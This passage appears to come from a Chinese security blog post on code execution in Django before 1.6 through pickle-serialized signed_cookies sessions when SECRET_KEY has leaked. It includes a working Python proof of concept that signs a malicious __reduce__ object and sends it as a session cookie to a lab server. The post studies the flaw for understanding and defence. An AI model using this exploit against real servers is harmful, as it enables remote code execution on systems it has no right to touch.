process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：123456789101112131415def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None): """ Reverse of dumps(), raises BadSignature if signature fails """ base64d = smart_str( TimestampSigner(key, salt=salt).unsign(s, max_age=max_age)) decompress = False if base64d[0] == '.': # It's compressed; uncompress it first base64d = base64d[1:] decompress = True data = b64_decode(base64d) if decompress: data = zlib.decompress(data) return serializer().loads(data) 3.4 构造POC12345678910111213141516171819202122import osos.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')from django.conf import settingsfrom django.core import signingfrom django.contrib.sessions.backends import signed_cookiesclass Run(object): def __reduce__(self): return (os.system,('touch /tmp/xxlegend.log',))sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')print sessimport urllib2import cookieliburl = 'http://10.24.35.228:8000/favicon.ico'headers = &#123;'Cookie':'sessionid="%s"' %(sess)&#125;request = urllib2.Request(url,headers = headers)response = urllib2.urlopen(request)print response.read() 通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。 总结利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。 https://github.com/danghvu/pwp/blob/master/exploit.pyhttps://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.htmlhttps://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/http://www.shysecurity.com/post/Reekeehttp://python.usyiyi.cn/django/topics/http/sessions.htmlhttps://github.com/django/django/blob/stable/1.5.x/django/core/signing.pyhttp://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Django</tag>
-        <tag>SECRET_KEY</tag>
-        <tag>代码执行</tag>
       </tags>
   </entry>
   <entry>
